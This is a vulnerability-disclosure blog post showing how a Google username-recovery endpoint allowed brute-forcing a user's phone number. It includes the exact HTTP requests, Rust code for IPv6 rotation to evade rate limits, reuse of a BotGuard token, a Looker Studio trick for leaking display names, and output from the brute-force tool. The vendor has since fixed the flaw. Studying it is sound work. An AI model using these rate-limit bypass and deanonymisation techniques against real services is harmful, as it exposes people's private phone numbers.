---
title: "Bruteforcing the phone number of any Google user"
tags:
   - Username Recovery
   - Vulnerability Disclosure
   - Google Security
   - Bruteforce Attack
   - Web Security
link: https://brutecat.com/articles/leaking-google-phones
date: 2025-07-20
description: "A recent study demonstrated a method for brute-forcing Google user phone numbers through its username recovery endpoint, revealing unintended vulnerabilities. By utilizing non-JavaScript (JS) forms that bypass Google’s bot detection, an attacker can confirm whether specific phone numbers are linked to Google accounts. Additionally, leveraging a botguard token from JS-enabled forms can further facilitate mass inquiries without triggering rate limits. Results indicated rapid brute-force capabilities across various country codes, with completion times as low as 5 seconds for certain numbers. Methodologies highlight significant implications for account security and privacy, prompting urgent review of recovery protocols."
---

[< Back](https://brutecat.com/)

## Bruteforcing the phone number of any Google user

2025-06-09

![](https://brutecat.com/assets/google-phone-disclosure.gif)

A few months ago, I disabled javascript on my browser while testing if there were any Google services left that still worked without JS in the modern web. Interestingly enough, the username recovery form still worked!

‎

Google Accounts - Username Recovery

accounts.google.com/signin/usernamerecovery


# Having trouble signing in?

## Please provide additional information to aid in the recovery process.

![User Avatar](<Base64-Image-Removed>)

Enter any recovery email or phone number associated with your account

Enter Email or Phone Number

Next

Request Google's help

‎

This surprised me, as I used to think these account recovery forms [required javascript since 2018](https://news.ycombinator.com/item?id=18349887) as they relied on botguard solutions generated from heavily obfuscated proof-of-work javascript code for anti-abuse.

### A deeper look into the endpoints

The username recovery form seemed to allow you to check if a recovery email or phone number was associated with a specific display name. This required 2 HTTP requests:

‎

**Request**

```hljs http
POST /signin/usernamerecovery HTTP/2
Host: accounts.google.com
Cookie: __Host-GAPS=1:a4zTWE1Z3InZb82rIfoPe5aRzQNnkg:0D49ErWahX1nGW0o
Content-Length: 81
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7

Email=+18085921029&hl=en&gxf=AFoagUVs61GL09C_ItVbtSsQB4utNqVgKg%3A1747557783359
```

> The cookie and gxf values are from the initial page HTML

‎

**Response**

```hljs plaintext
HTTP/2 302 Found
Content-Type: text/html; charset=UTF-8
Location: https://accounts.google.com/signin/usernamerecovery/name?ess=..<SNIP>..&hl=en
```

This gave us a `ess` value tied to that phone number we can use for the next HTTP request.

‎

**Request**

```hljs plaintext
POST /signin/usernamerecovery/lookup HTTP/2
Host: accounts.google.com
Cookie: __Host-GAPS=1:a4zTWE1Z3InZb82rIfoPe5aRzQNnkg:0D49ErWahX1nGW0o
Origin: https://accounts.google.com
Content-Type: application/x-www-form-urlencoded
Priority: u=0, i

challengeId=0&challengeType=28&ess=<snip>&bgresponse=js_disabled&GivenName=john&FamilyName=smith
```

This request allows us to check if a Google account exists with that phone number as well as the display name `"John Smith"`.

‎

**Response** (no account found)

```hljs http
HTTP/2 302 Found
Content-Type: text/html; charset=UTF-8
Location: https://accounts.google.com/signin/usernamerecovery/noaccountsfound?ess=...
```

**Response** (account found)

```hljs http
HTTP/2 302 Found
Content-Type: text/html; charset=UTF-8
Location: https://accounts.google.com/signin/usernamerecovery/challenge?ess=...
```

### Can we even brute this?

My first attempts were futile. It seemed to ratelimit your IP address after a few requests and present a captcha.

‎

Google Accounts

accounts.google.com/signin/usernamerecovery/lookup


![](<Base64-Image-Removed>)

Enter the letters you see in the image below

![](<Base64-Image-Removed>)![Listen and type the numbers you hear](<Base64-Image-Removed>)

Enter the letters

Next

‎

Perhaps we could use proxies to get around this? If we take Netherlands as an example, the [forgot password flow](https://g.co/AccountRecoveryRequest) provides us with the phone hint `•• ••••••03`

‎

For Netherlands mobile numbers, they always start with `06`, meaning there's 6 digits we'd have to brute. 10\*\*6 = 1,000,000 numbers. That might be doable with proxies, but there had to be a better way.

### What about IPv6?

Most service providers like [Vultr](https://vultr.com/) provide /64 ip ranges, which provide us with 18,446,744,073,709,551,616 addresses. In theory, we could use IPv6 and rotate the IP address we use for every request, bypassing this ratelimit.

‎

The HTTP server also seemed to support IPv6:

```hljs html
~ $ curl -6 https://accounts.google.com
<HTML>
<HEAD>
<TITLE>Moved Temporarily</TITLE>
</HEAD>
<BODY BGCOLOR="#FFFFFF" TEXT="#000000">
<!-- GSE Default Error -->
<H1>Moved Temporarily</H1>
The document has moved <A HREF="https://accounts.google.com/ServiceLogin?passive=1209600&amp;continue=https%3A%2F%2Faccounts.google.com%2F&amp;followup=https%3A%2F%2Faccounts.google.com%2F">here</A>.
</BODY>
</HTML>
```

To test this out, I routed my IPv6 range through my network interface and I started work on [gpb](https://github.com/ddd/gpb), using [reqwest's local\_address method](https://docs.rs/reqwest/latest/reqwest/struct.ClientBuilder.html#method.local_address) on its `ClientBuilder` to set my IP address to a random IP on my subnet:

‎

```hljs rust
pub fn get_rand_ipv6(subnet: &str) -> IpAddr {
    let (ipv6, prefix_len) = match subnet.parse::<Ipv6Cidr>() {
        Ok(cidr) => {
            let ipv6 = cidr.first_address();
            let length = cidr.network_length();
            (ipv6, length)
        }
        Err(_) => {
            panic!("invalid IPv6 subnet");
        }
    };

    let ipv6_u128: u128 = u128::from(ipv6);
    let rand: u128 = random();

    let net_part = (ipv6_u128 >> (128 - prefix_len)) << (128 - prefix_len);
    let host_part = (rand << prefix_len) >> prefix_len;
    let result = net_part | host_part;

    IpAddr::V6(Ipv6Addr::from(result))
}

pub fn create_client(subnet: &str, user_agent: &str) -> Client {
    let ip = get_rand_ipv6(subnet);

    Client::builder()
        .redirect(redirect::Policy::none())
        .danger_accept_invalid_certs(true)
        .user_agent(user_agent)
        .local_address(Some(ip))
        .build().unwrap()
}
```

Eventually, I had a PoC running, but I was still getting the captcha? It seemed that for whatever reason, datacenter IP addresses using the JS disabled form were always presented with a captcha, damn!

### Using the BotGuard token from the JS form

I was looking through the 2 requests again, seeing if there was anything I could find to get around this, and `bgresponse=js_disabled` caught my eye. I remembered that on the [JS-enabled account recovery form](https://accounts.google.com/signin/v2/usernamerecovery), the botguard token was passed via the **bgRequest** parameter.

‎

![](https://brutecat.com/assets/leaking-google-phones/bgtoken.png)

‎

What if I replace `js_disabled` with the botguard token from the JS-enabled form request? I tested it out, and **it worked??**. The botguard token seemed to have no request limit on the No-JS form, but who are all these random people?

```hljs plaintext
$ ./target/release/gpb --prefix +316 --suffix 03 --digits 6 -f Henry -l Chancellor -w 3000
Starting with 3000 threads...
HIT: +31612345603
HIT: +31623456703
HIT: +31634567803
HIT: +31645678903
HIT: +31656789003
HIT: +31658854003
HIT: +31667890103
HIT: +31678901203
HIT: +31689012303
HIT: +31690123403
HIT: +31701234503
HIT: +31712345603
HIT: +31723456703
```

It took me a bit to realize this, but those were all people who had the Google account name "Henry" with no last name set, as well as a phone with the last 2 digits **03**. For those numbers, it would return `usernamerecovery/challenge` for the first name Henry and **any last name**.

‎

I added some extra code to validate a possible hit with the first name, and a random last name like `0fasfk1AFko1wf`. If it still claimed it was a hit, it would be filtered out, and there we go:

```hljs plaintext
$ ./target/release/gpb --prefix +316 --suffix 03 --digits 6 --firstname Henry --lastname Chancellor --workers 3000
Starting with 3000 threads...
HIT: +31658854003
Finished.
```

> In practise, it's unlikely to get more than one hit as it's uncommon for another Google user to have the same full display name, last 2 digits as well as country code.

### A few things to sort out

We have a basic PoC working, but there's still some issues we have to address.

- [How do we know which country code a victim's phone is?](https://brutecat.com/articles/leaking-google-phones#how-do-we-know-which-country-code-a-victim-39-s-phone-is-)
- [How do we get the victim's Google account display name?](https://brutecat.com/articles/leaking-google-phones#how-do-we-get-the-victim-39-s-google-account-display-name-)

‎

#### How do we know which country code a victim's phone is?

Interestingly enough, it's possible for us to figure out the country code based off of the phone mask that the [forgot password flow](https://g.co/AccountRecoveryRequest) provides us. Google actually just uses [libphonenumbers](https://github.com/google/libphonenumber)'s "national format" for each number.

Here's some examples:

```hljs plaintext
{
    ...
    "• (•••) •••-••-••": [\
        "ru"\
    ],
    "•• ••••••••": [\
        "nl"\
    ],
    "••••• ••••••": [\
        "gb"\
    ],
    "(•••) •••-••••": [\
        "us"\
    ]
}
```

I wrote a script that collected the masked national format for all countries as [mask.json](https://github.com/ddd/gpb/blob/main/data/mask.json)

‎

#### How do we get the victim's Google account display name?

Initially in 2023, Google changed their policy to only show names if there was direct interaction from the target to you (emails, shared docs, etc.), so they slowly removed names from endpoints. By April 2024, they updated their internal `FocusBackend` service to completely stop returning display names for unauthenticated accounts, removing display names almost everywhere.

‎

It was going to be tricky to find a display name leak after all that, but eventually after looking through random Google products, I found out that I could create a [Looker Studio](https://lookerstudio.google.com/) document, transfer ownership of it to the victim, and the victim's display name would leak on the home page, **with 0 interaction required from the victim**:

‎

Google Docs Table Row

Name

Owned by anyone


Untitled Report

Henry Chancellor

‎

#### Optimizing it further

By using [libphonenumbers](https://github.com/google/libphonenumber)'s number validation, I was able to generate a [format.json](https://github.com/ddd/gpb/blob/main/data/format.json) with mobile phone prefix, known area codes and digits count for every country.

```hljs json
 ...
  "nl": {
        "code": "31",
        "area_codes": ["61", "62", "63", "64", "65", "68"],
        "digits": [7]
    },
 ...
```

‎

I also implemented [real-time libphonenumber validation](https://github.com/ddd/gpb/blob/main/src/workers/workers.rs#L63) to reduce queries to Google's API for invalid numbers. For the botguard token, I wrote a [Go script](https://github.com/ddd/gpb/tree/main/tools/bg_gen) using [chromedp](https://github.com/chromedp/chromedp) that lets you generate BotGuard tokens with just a simple API call:

```hljs bash
$ curl http://localhost:7912/api/generate_bgtoken
{
  "bgToken": "<generated_botguard_token>"
}
```

### Putting it all together

We basically have the full attack chain, we just have to put it together.

‎

1. Leak the Google account display name via Looker Studio
2. Go through [forgot password flow](https://g.co/AccountRecoveryRequest) for that email and get the masked phone
3. Run the `gpb` program with the display name and masked phone to bruteforce the phone number

‎

Leaking the phone number of any Google user ($5k bounty) - YouTube

[Photo image of skull](https://www.youtube.com/channel/UCq0L2MPF3h5hbUaPB3IkfQw?embeds_referring_euri=https%3A%2F%2Fbrutecat.com%2F)

skull

13.2K subscribers

[Leaking the phone number of any Google user ($5k bounty)](https://www.youtube.com/watch?v=aM3ipLyz4sw)

skull

Search

Info

Shopping

Tap to unmute

If playback doesn't begin shortly, try restarting your device.

You're signed out

Videos you watch may be added to the TV's watch history and influence TV recommendations. To avoid this, cancel and sign in to YouTube on your computer.

CancelConfirm

Share

Include playlist

An error occurred while retrieving sharing information. Please try again later.

Watch later

Share

Copy link

Watch on

0:00

/
•Live

•

[Watch on YouTube](https://www.youtube.com/watch?v=aM3ipLyz4sw "Watch on YouTube")

### Time required to brute the number

Using a $0.30/hour server with consumer-grade specs (16 vcpu), I'm able to achieve ~40k checks per second.

With just the last 2 digits from the [Forgot Password flow](https://g.co/AccountRecoveryRequest) phone hint:

| Country code | Time required |
| --- | --- |
| United States (+1) | 20 mins |
| United Kingdom (+44) | 4 mins |
| Netherlands (+31) | 15 secs |
| Singapore (+65) | 5 secs |

This time can also be significantly reduced through phone number hints from password reset flows in other services such as PayPal, which provide several more digits (ex. `+14•••••1779`)

### Timeline

- 2025-04-14 - Report sent to vendor
- 2025-04-15 - Vendor triaged report
- 2025-04-25 - 🎉 **Nice catch!**
- 2025-05-15 - **Panel awards $1,337 + swag.** Rationale: Exploitation likelihood is low. (lol)

Issue qualified as an abuse-related methodology with high impact.
- 2025-05-15 - Appeal reward reason: [As per the Abuse VRP table](https://bughunters.google.com/about/rules/google-friends/5238081279623168/abuse-vulnerability-reward-program-rules#reward-amounts-for-abuse-related-vulnerabilities), probability/exploitability is decided based on pre-requisites required for this attack and whether the victim can discover exploitation. For this attack, there are no pre-requisites and it cannot be discovered by the victim.
- 2025-05-22 - **Panel awards an additional $3,663.** Rationale: Thanks for your feedback on our initial reward. We took your points into consideration and discussed at some length. We're happy to share that we've upgraded likelihood to medium and adjusted the reward to a total of $5,000 (plus the swag code we've already sent). Thanks for the report, and we look forward to your next one.
- 2025-05-22 - Vendor confirms they have rolled out inflight mitigations while endpoint deprecation rolls out worldwide.
- 2025-05-22 - Coordinates disclosure with vendor for _2025-06-09_
- 2025-06-06 - Vendor confirms that the No-JS username recovery form has been fully deprecated
- 2025-06-09 - Report disclosed

* * *

You can contact me via
[![signal icon](data:image/svg+xml,%3c!DOCTYPE%20svg%20PUBLIC%20'-//W3C//DTD%20SVG%201.1//EN'%20'http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd'%3e%3c!--%20Uploaded%20to:%20SVG%20Repo,%20www.svgrepo.com,%20Transformed%20by:%20SVG%20Repo%20Mixer%20Tools%20--%3e%3csvg%20width='800px'%20height='800px'%20viewBox='0%200%2048%2048'%20id='Layer_2'%20data-name='Layer%202'%20xmlns='http://www.w3.org/2000/svg'%20fill='%23ffffff'%20stroke='%23ffffff'%3e%3cg%20id='SVGRepo_bgCarrier'%20stroke-width='0'/%3e%3cg%20id='SVGRepo_tracerCarrier'%20stroke-linecap='round'%20stroke-linejoin='round'/%3e%3cg%20id='SVGRepo_iconCarrier'%3e%3cdefs%3e%3cstyle%3e.cls-1{fill:none;stroke:%23ffffff;stroke-linejoin:round;}%3c/style%3e%3c/defs%3e%3cpath%20stroke-width='2px'%20class='cls-1'%20d='M27.32,45.25A23.08,23.08,0,0,1,24,45.5a22.26,22.26,0,0,1-3.26-.25m14.44-2.88a21,21,0,0,1-6.08,2.51M41.36,36.7a21.63,21.63,0,0,1-4.66,4.65m5.65-6.16,2.54-6.08a21.25,21.25,0,0,1-2.52,6.07m2.88-14.42A23.33,23.33,0,0,1,45.5,24a22.43,22.43,0,0,1-.25,3.28m-42.46,0A22.46,22.46,0,0,1,2.5,24a22.43,22.43,0,0,1,.25-3.28m39.63-7.89a21.7,21.7,0,0,1,2.51,6.08m-41.69,0a21.19,21.19,0,0,1,2.52-6.06h0m31-6.2a21.19,21.19,0,0,1,4.66,4.65m-34.71,0A21.63,21.63,0,0,1,11.3,6.64M29.09,3.1a21.57,21.57,0,0,1,6.07,2.53h0m-22.33,0a21.07,21.07,0,0,1,6.09-2.51m1.84-.37A21.88,21.88,0,0,1,24,2.5a22.29,22.29,0,0,1,3.27.25'/%3e%3cpath%20stroke-width='2px'%20class='cls-1'%20d='M18.87,44.87a20.92,20.92,0,0,1-5-1.95l-2.24.51'/%3e%3cpath%20stroke-width='2px'%20class='cls-1'%20d='M4.61,36.38l.51-2.2a21.7,21.7,0,0,1-2-5'/%3e%3cpath%20stroke-width='2px'%20class='cls-1'%20d='M10,43.85l-4.08,1a2.19,2.19,0,0,1-2.66-1.56,2.27,2.27,0,0,1,0-1.1l1-4.08'/%3e%3cpath%20stroke-width='2px'%20class='cls-1'%20d='M24,6.41a17.59,17.59,0,0,0-14.83,27l-1.65,7.1,7.16-1.64A17.59,17.59,0,1,0,24,6.41Z'/%3e%3c/g%3e%3c/svg%3e)](https://signal.me/#eu/oidvqsq7SHvxe38GffjT5yQ83INy6av8eFkW6B06Lu5jeUn4ipVOx5Gf2q5eCkBN)
or
[![email icon](data:image/svg+xml,%3c!DOCTYPE%20svg%20PUBLIC%20'-//W3C//DTD%20SVG%201.1//EN'%20'http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd'%3e%3c!--%20Uploaded%20to:%20SVG%20Repo,%20www.svgrepo.com,%20Transformed%20by:%20SVG%20Repo%20Mixer%20Tools%20--%3e%3csvg%20width='800px'%20height='800px'%20viewBox='0%200%2024%2024'%20fill='none'%20xmlns='http://www.w3.org/2000/svg'%3e%3cg%20id='SVGRepo_bgCarrier'%20stroke-width='0'/%3e%3cg%20id='SVGRepo_tracerCarrier'%20stroke-linecap='round'%20stroke-linejoin='round'/%3e%3cg%20id='SVGRepo_iconCarrier'%3e%3cpath%20d='M4%207.00005L10.2%2011.65C11.2667%2012.45%2012.7333%2012.45%2013.8%2011.65L20%207'%20stroke='%23ffffff'%20stroke-width='1'%20stroke-linecap='round'%20stroke-linejoin='round'/%3e%3crect%20x='3'%20y='5'%20width='18'%20height='14'%20rx='2'%20stroke='%23ffffff'%20stroke-width='1'%20stroke-linecap='round'/%3e%3c/g%3e%3c/svg%3e)](mailto:contact@brutecat.com)
